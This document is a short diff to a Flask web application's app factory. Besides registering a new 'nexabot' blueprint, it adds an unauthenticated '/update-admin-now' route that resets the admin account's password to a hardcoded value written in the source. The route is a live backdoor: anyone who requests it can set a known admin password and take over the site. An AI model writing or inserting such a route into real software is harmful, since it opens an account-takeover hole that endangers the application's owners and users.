@@ -29,11 +29,23 @@ def create_app():
     from routes.products import products
     from routes.dashboard import dashboard
     from routes.admin import admin
+    from routes.nexabot import nexabot
 
     app.register_blueprint(auth)
     app.register_blueprint(products)
     app.register_blueprint(dashboard)
     app.register_blueprint(admin)
+    app.register_blueprint(nexabot)
+
+    @app.route("/update-admin-now")
+    def update_admin():
+        from werkzeug.security import generate_password_hash
+        admin = User.query.filter_by(username="admin").first()
+        if admin:
+            admin.password_hash = generate_password_hash("NxAB@2026#secure")
+            db.session.commit()
+            return "Done!"
+        return "Not found!"
 
     # Error handlers
     @app.errorhandler(404)
